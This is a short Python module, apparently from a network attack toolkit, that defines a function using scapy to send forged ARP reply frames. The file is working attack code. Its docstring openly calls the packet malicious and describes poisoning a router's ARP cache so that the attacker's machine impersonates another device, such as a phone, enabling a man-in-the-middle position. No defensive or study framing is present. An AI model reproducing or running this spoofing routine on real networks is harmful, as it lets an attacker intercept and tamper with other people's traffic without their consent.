import scapy.all as scapy
from scapy.all import conf
from ..utils import get_mac

def send_spoof_packet(target_ip, spoof_ip):
    """
    This function takes two arguments; the ip of the arp poisoning target, and the ip of the device being spoofed.
    First, collect the target_ip's mac adress with the get_mac util function.
    Then, use scapy.ARP() to build the malicious packet. This packet is an "answer"; we are asserting to the network's ARP table the new,
    impersonated mac address which the router thinks is the phone. 
    Finally, send the packet to the network with scapy.send()
    """

    target_mac = get_mac(target_ip)

    # If MAC address cannot be found, return
    if not target_mac:
        print(f"[-] Could not resolve MAC address for {target_ip}. Skipping a spoof packet.")
        return


    # Poison the router ARP cache
    # op = 2; this is an answer, not a request
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Layer 2 Ethernet frame, setting destination MAC
    ether_frame = scapy.Ether(dst=target_mac)

    # Combine frame and ARP packet
    full_packet = ether_frame / arp_packet

    # Send packet to network
    scapy.sendp(full_packet, verbose=False)
